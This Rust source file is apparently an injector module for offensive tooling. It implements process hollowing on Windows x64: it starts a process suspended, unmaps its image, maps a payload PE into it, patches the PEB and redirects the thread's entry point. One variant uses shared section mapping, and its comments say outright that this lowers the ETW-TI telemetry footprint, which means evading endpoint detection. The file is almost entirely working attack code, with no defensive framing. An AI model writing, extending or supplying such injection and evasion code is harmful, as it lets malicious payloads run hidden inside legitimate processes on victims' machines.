#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT},
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED},
    },
};

// Process-hollowing PEB acquisition fix:
// On x64, GetThreadContext does NOT encode PEB base in any register after CREATE_SUSPENDED.
// The correct source is NtQueryInformationProcess(ProcessBasicInformation).
// Context is still needed to set the entry-point (Rcx) and resume the thread.

// CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT for AMD64
// windows-sys 0.52 does not export this as a named constant
const CONTEXT_FULL_AMD64: u32 = 0x0010_000B;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;

struct PeHeaders {
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<SectionInfo>,
    reloc_rva: u32,
    reloc_size: u32,
    import_rva: u32,
    import_size: u32,
}

struct SectionInfo {
    virtual_address: u32,
    virtual_size: u32,
    raw_offset: u32,
    raw_size: u32,
    characteristics: u32,
}

#[cfg(target_os = "windows")]
fn parse_pe_headers(pe: &[u8]) -> Option<PeHeaders> {
    if pe.len() < 64 {
        return None;
    }
    let e_magic = u16::from_le_bytes([pe[0], pe[1]]);
    if e_magic != 0x5A4D {
        return None;
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if pe.len() < e_lfanew + 4 {
        return None;
    }
    let sig = u32::from_le_bytes([pe[e_lfanew], pe[e_lfanew+1], pe[e_lfanew+2], pe[e_lfanew+3]]);
    if sig != 0x00004550 {
        return None;
    }
    let fh = e_lfanew + 4;
    if pe.len() < fh + 20 {
        return None;
    }
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let oh = fh + 20;
    if pe.len() < oh + size_of_opt {
        return None;
    }
    let magic = u16::from_le_bytes([pe[oh], pe[oh+1]]);
    if magic != 0x020B {
        // Only PE32+ supported
        return None;
    }
    let entry_point_rva = u32::from_le_bytes([pe[oh+16], pe[oh+17], pe[oh+18], pe[oh+19]]);
    let image_base = u64::from_le_bytes([
        pe[oh+24], pe[oh+25], pe[oh+26], pe[oh+27],
        pe[oh+28], pe[oh+29], pe[oh+30], pe[oh+31],
    ]);
    let size_of_image = u32::from_le_bytes([pe[oh+56], pe[oh+57], pe[oh+58], pe[oh+59]]);
    let size_of_headers = u32::from_le_bytes([pe[oh+60], pe[oh+61], pe[oh+62], pe[oh+63]]);
    let num_rva = u32::from_le_bytes([pe[oh+108], pe[oh+109], pe[oh+110], pe[oh+111]]) as usize;

    // Data directory [1] = import table (RVA at oh+120, size at oh+124)
    let import_rva;
    let import_size;
    if num_rva > 1 {
        let import_dd = oh + 112 + 1 * 8;
        if pe.len() >= import_dd + 8 {
            import_rva  = u32::from_le_bytes([pe[import_dd],   pe[import_dd+1], pe[import_dd+2], pe[import_dd+3]]);
            import_size = u32::from_le_bytes([pe[import_dd+4], pe[import_dd+5], pe[import_dd+6], pe[import_dd+7]]);
        } else {
            import_rva = 0; import_size = 0;
        }
    } else {
        import_rva = 0; import_size = 0;
    }

    // Data directory [5] = base relocation table
    let reloc_rva;
    let reloc_size;
    if num_rva > 5 {
        let reloc_dd = oh + 112 + 5 * 8;
        if pe.len() >= reloc_dd + 8 {
            reloc_rva = u32::from_le_bytes([pe[reloc_dd], pe[reloc_dd+1], pe[reloc_dd+2], pe[reloc_dd+3]]);
            reloc_size = u32::from_le_bytes([pe[reloc_dd+4], pe[reloc_dd+5], pe[reloc_dd+6], pe[reloc_dd+7]]);
        } else {
            reloc_rva = 0;
            reloc_size = 0;
        }
    } else {
        reloc_rva = 0;
        reloc_size = 0;
    }

    let sh_base = oh + size_of_opt;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = sh_base + i * 40;
        if pe.len() < s + 40 {
            break;
        }
        sections.push(SectionInfo {
            virtual_address: u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]),
            virtual_size:    u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]),
            raw_offset:      u32::from_le_bytes([pe[s+20], pe[s+21], pe[s+22], pe[s+23]]),
            raw_size:        u32::from_le_bytes([pe[s+16], pe[s+17], pe[s+18], pe[s+19]]),
            characteristics: u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]),
        });
    }

    Some(PeHeaders {
        image_base,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
    })
}

#[cfg(target_os = "windows")]
pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_read, nt_unmap_view, nt_resume_thread};
    use core::ptr::null_mut;
    use std::ffi::CString;

    let headers = parse_pe_headers(payload_pe).ok_or_else(|| String::from("invalid PE"))?;

    // Build a locally-resolved image before touching the remote process.
    // This avoids the RVA-vs-file-offset bug: apply_relocations_local and resolve_iat_local
    // read from the mapped (virtual) layout, not from raw file bytes where RVA != file offset.
    let image_size = headers.size_of_image as usize;
    let mut local_image: Vec<u8> = vec![0u8; image_size];

    let hdr_end = (headers.size_of_headers as usize).min(payload_pe.len()).min(image_size);
    local_image[..hdr_end].copy_from_slice(&payload_pe[..hdr_end]);
    for sec in &headers.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let src_end = (sec.raw_offset as usize).saturating_add(sec.raw_size as usize);
        if src_end > payload_pe.len() { continue; }
        let dst_start = sec.virtual_address as usize;
        let dst_end = dst_start.saturating_add(sec.raw_size as usize);
        if dst_end > image_size { continue; }
        local_image[dst_start..dst_end]
            .copy_from_slice(&payload_pe[sec.raw_offset as usize..src_end]);
    }

    let exe_cstr = CString::new(target_exe).map_err(|_| String::from("invalid exe path"))?;
    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_cstr.as_ptr() as *const u8,
            null_mut(), null_mut(), null_mut(), 0,
            CREATE_SUSPENDED, null_mut(), null_mut(),
            &mut si, &mut pi,
        )
    };
    if ok == 0 {
        return Err("CreateProcessA failed".into());
    }

    let proc   = pi.hProcess as isize;
    let thread = pi.hThread  as isize;

    use crate::syscall::{ProcessBasicInformation, nt_query_information_process};
    let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
    let mut ret_len: u32 = 0;
    let status = unsafe {
        nt_query_information_process(
            proc, 0,
            &mut pbi as *mut ProcessBasicInformation as *mut u8,
            core::mem::size_of::<ProcessBasicInformation>() as u32,
            &mut ret_len,
        )
    };
    if status < 0 || pbi.peb_base_address == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("NtQueryInformationProcess failed".into());
    }
    let peb_base = pbi.peb_base_address as u64;

    let mut image_base_remote: u64 = 0;
    let mut nread: usize = 0;
    let status = unsafe {
        nt_read(proc, (peb_base + 0x10) as *const u8,
                &mut image_base_remote as *mut u64 as *mut u8, 8, &mut nread)
    };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("read peb failed".into());
    }

    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if unsafe { GetThreadContext(pi.hThread as _, &mut ctx) } == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("GetThreadContext failed".into());
    }

    unsafe { nt_unmap_view(proc, image_base_remote as *mut u8); }

    let mut new_base: *mut u8 = headers.image_base as *mut u8;
    let mut alloc_size: usize = image_size;
    let status = unsafe {
        nt_alloc(proc, &mut new_base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    let new_base = if status < 0 || new_base.is_null() {
        let mut fallback: *mut u8 = null_mut();
        let status = unsafe {
            nt_alloc(proc, &mut fallback, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        };
        if status < 0 || fallback.is_null() {
            unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
            return Err("alloc failed".into());
        }
        fallback
    } else {
        new_base
    };

    // Apply relocations and IAT to the local image using the actual remote load address.
    let delta = new_base as i64 - headers.image_base as i64;
    if delta != 0 && headers.reloc_rva != 0 && headers.reloc_size != 0 {
        apply_relocations_local(local_image.as_mut_ptr(), headers.reloc_rva, headers.reloc_size, delta);
    }
    unsafe { resolve_iat_local(local_image.as_mut_ptr(), headers.import_rva, headers.import_size); }

    // Write the fully-resolved image to the remote process in one call.
    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, new_base, local_image.as_ptr(), image_size, &mut written)
    };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("write image failed".into());
    }

    // Set section permissions
    for sec in &headers.sections {
        const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
        const IMAGE_SCN_MEM_WRITE:   u32 = 0x80000000;
        let prot = match (
            sec.characteristics & IMAGE_SCN_MEM_EXECUTE != 0,
            sec.characteristics & IMAGE_SCN_MEM_WRITE   != 0,
        ) {
            (true, _)      => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            _              => PAGE_READONLY,
        };
        let mut sec_base = unsafe { new_base.add(sec.virtual_address as usize) };
        let mut sec_size = sec.virtual_size as usize;
        let mut old: u32 = 0;
        unsafe { nt_protect(proc, &mut sec_base, &mut sec_size, prot, &mut old); }
    }

    let new_base_val: u64 = new_base as u64;
    let mut w: usize = 0;
    unsafe {
        nt_write(proc, (peb_base + 0x10) as *mut u8,
                 &new_base_val as *const u64 as *const u8, 8, &mut w);
    }

    ctx.Rcx = new_base as u64 + headers.entry_point_rva as u64;
    if unsafe { SetThreadContext(pi.hThread as _, &ctx) } == 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("SetThreadContext failed".into());
    }

    let mut suspend_count: u32 = 0;
    unsafe {
        nt_resume_thread(thread, &mut suspend_count);
        CloseHandle(pi.hProcess as _);
        CloseHandle(pi.hThread as _);
    }

    Ok(())
}

/// Section-based hollow into a pre-existing suspended (proc, thread) pair.
///
/// ETW-TI footprint vs. the old VirtualAllocEx approach:
///   Old: ALLOCVM_REMOTE + WRITEVM_REMOTE × N + PROTECTVM_REMOTE × N
///   New: MAPVIEW_LOCAL  + MAPVIEW_REMOTE × 1 + WRITEVM_REMOTE × 1 (PEB only)
///
/// We write PE content, relocations, and IAT through the local map (no cross-process
/// writes for payload delivery).  The remote process receives the finished image via a
/// single NtMapViewOfSection call.
#[cfg(target_os = "windows")]
pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> super::InjectResult {
    use crate::syscall::{
        nt_create_section, nt_map_view, nt_unmap_view, nt_close,
        nt_write, nt_read, nt_resume_thread,
        ProcessBasicInformation, nt_query_information_process,
        CURRENT_PROCESS,
    };

    let headers = parse_pe_headers(payload_pe).ok_or_else(|| String::from("hollow_into: invalid PE"))?;

    // Locate PEB and original image base.
    let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
    let mut ret_len: u32 = 0;
    if unsafe {
        nt_query_information_process(proc, 0,
            &mut pbi as *mut _ as *mut u8,
            core::mem::size_of::<ProcessBasicInformation>() as u32,
            &mut ret_len)
    } < 0 || pbi.peb_base_address == 0 {
        return Err("hollow_into: NtQueryInformationProcess failed".into());
    }
    let peb = pbi.peb_base_address as u64;

    let mut orig_base: u64 = 0;
    let mut nr: usize = 0;
    if unsafe { nt_read(proc, (peb + 0x10) as *const u8,
                        &mut orig_base as *mut u64 as *mut u8, 8, &mut nr) } < 0 {
        return Err("hollow_into: PEB read failed".into());
    }

    // Capture thread context (needed for entry-point redirect before resume).
    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if unsafe { GetThreadContext(thread as _, &mut ctx) } == 0 {
        return Err("hollow_into: GetThreadContext failed".into());
    }

    // Create a pagefile-backed section large enough for the image.
    const SEC_COMMIT:             u32 = 0x0800_0000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;

    let mut image_size = headers.size_of_image as i64;
    let mut h_section: isize = 0;
    if unsafe { nt_create_section(&mut h_section, SECTION_ALL_ACCESS, &mut image_size,
                                   PAGE_EXECUTE_READWRITE, SEC_COMMIT) } < 0 || h_section == 0 {
        return Err("hollow_into: NtCreateSection failed".into());
    }

    // Map a local RW view — we write all content here, never into the remote process directly.
    let mut local_base: *mut u8 = core::ptr::null_mut();
    let mut local_size: usize = headers.size_of_image as usize;
    if unsafe { nt_map_view(h_section, CURRENT_PROCESS, &mut local_base, &mut local_size,
                             PAGE_EXECUTE_READWRITE) } < 0 || local_base.is_null() {
        unsafe { nt_close(h_section) };
        return Err("hollow_into: local NtMapViewOfSection failed".into());
    }

    // Copy headers and sections into local map.
    unsafe {
        core::ptr::copy_nonoverlapping(
            payload_pe.as_ptr(), local_base, headers.size_of_headers as usize);
    }
    for sec in &headers.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let end = (sec.raw_offset as usize).saturating_add(sec.raw_size as usize);
        if end > payload_pe.len() { continue; }
        unsafe {
            core::ptr::copy_nonoverlapping(
                payload_pe.as_ptr().add(sec.raw_offset as usize),
                local_base.add(sec.virtual_address as usize),
                sec.raw_size as usize,
            );
        }
    }

    // Unmap the original executable so the preferred VA is free for our section.
    unsafe { nt_unmap_view(proc, orig_base as *mut u8) };

    // Map section into remote process — try preferred base first, fall back to anywhere.
    let mut remote_base: *mut u8 = headers.image_base as *mut u8;
    let mut remote_size: usize = headers.size_of_image as usize;
    if unsafe { nt_map_view(h_section, proc, &mut remote_base, &mut remote_size,
                             PAGE_EXECUTE_READ) } < 0 || remote_base.is_null() {
        let mut fb: *mut u8 = core::ptr::null_mut();
        let mut fs: usize = headers.size_of_image as usize;
        if unsafe { nt_map_view(h_section, proc, &mut fb, &mut fs, PAGE_EXECUTE_READ) } < 0
            || fb.is_null()
        {
            unsafe { nt_unmap_view(CURRENT_PROCESS, local_base); nt_close(h_section); }
            return Err("hollow_into: remote NtMapViewOfSection failed".into());
        }
        remote_base = fb;
    }

    // Apply relocations and resolve IAT through the local map.
    // Local and remote views share physical pages — patching local is visible in remote.
    let delta = remote_base as i64 - headers.image_base as i64;
    if delta != 0 && headers.reloc_rva != 0 && headers.reloc_size != 0 {
        apply_relocations_local(local_base, headers.reloc_rva, headers.reloc_size, delta);
    }
    unsafe { resolve_iat_local(local_base, headers.import_rva, headers.import_size); }

    // Release local view — payload is now fully prepared in the shared section.
    unsafe { nt_unmap_view(CURRENT_PROCESS, local_base); }
    unsafe { nt_close(h_section) };

    // PEB.ImageBaseAddress — the only remaining cross-process write.
    let nb64: u64 = remote_base as u64;
    let mut w: usize = 0;
    unsafe { nt_write(proc, (peb + 0x10) as *mut u8,
                      &nb64 as *const u64 as *const u8, 8, &mut w) };

    // Redirect thread entry point to our PE entry and resume.
    ctx.Rcx = remote_base as u64 + headers.entry_point_rva as u64;
    if unsafe { SetThreadContext(thread as _, &ctx) } == 0 {
        return Err("hollow_into: SetThreadContext failed".into());
    }
    let mut sc: u32 = 0;
    unsafe { nt_resume_thread(thread, &mut sc) };
    Ok(())
}

/// Apply base relocations to a locally-mapped image.
/// Reads relocation table from the mapped image (RVAs, not file offsets).
#[cfg(target_os = "windows")]
fn apply_relocations_local(local_base: *mut u8, reloc_rva: u32, reloc_size: u32, delta: i64) {
    let mut offset = reloc_rva as usize;
    let end = offset + reloc_size as usize;
    loop {
        if offset + 8 > end { break; }
        let page_rva   = unsafe { (local_base.add(offset)     as *const u32).read_unaligned() };
        let block_size = unsafe { (local_base.add(offset + 4) as *const u32).read_unaligned() } as usize;
        if block_size < 8 { break; }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry = unsafe { (local_base.add(offset + 8 + i * 2) as *const u16).read_unaligned() };
            if entry >> 12 == 10 { // IMAGE_REL_BASED_DIR64
                let target = unsafe { local_base.add((page_rva + (entry & 0x0FFF) as u32) as usize) as *mut i64 };
                unsafe { target.write_unaligned(target.read_unaligned().wrapping_add(delta)) };
            }
        }
        offset += block_size;
    }
}

/// Resolve the IAT of a locally-mapped image via GetProcAddress.
/// Writes resolved addresses directly into the local map (no cross-process calls).
/// System DLLs are ASLR-randomised once per boot; addresses match across all processes.
#[cfg(target_os = "windows")]
unsafe fn resolve_iat_local(local_base: *mut u8, import_rva: u32, import_size: u32) {
    if import_rva == 0 || import_size == 0 { return; }
    let mut desc = local_base.add(import_rva as usize);
    let desc_end = local_base.add((import_rva + import_size) as usize);

    while desc.add(20) <= desc_end {
        let ilt_rva     = (desc      as *const u32).read_unaligned() as usize;
        let name_rva    = (desc.add(12) as *const u32).read_unaligned() as usize;
        let first_thunk = (desc.add(16) as *const u32).read_unaligned() as usize;
        desc = desc.add(20);
        if ilt_rva == 0 && name_rva == 0 && first_thunk == 0 { break; }
        if name_rva == 0 || first_thunk == 0 { continue; }

        let dll_name = local_base.add(name_rva);
        let hmod = GetModuleHandleA(dll_name);
        let hmod = if hmod == 0 { LoadLibraryA(dll_name) } else { hmod };
        if hmod == 0 { continue; }

        let lookup = if ilt_rva != 0 { ilt_rva } else { first_thunk };
        let mut i = 0usize;
        loop {
            let thunk = (local_base.add(lookup + i * 8) as *const u64).read_unaligned();
            if thunk == 0 { break; }
            let fn_ptr = if thunk & (1u64 << 63) != 0 {
                GetProcAddress(hmod, (thunk & 0xFFFF) as u16 as usize as *const u8)
            } else {
                GetProcAddress(hmod, local_base.add(thunk as usize + 2)) // skip 2-byte hint
            };
            if let Some(addr) = fn_ptr {
                (local_base.add(first_thunk + i * 8) as *mut u64)
                    .write_unaligned(addr as usize as u64);
            }
            i += 1;
        }
    }
}

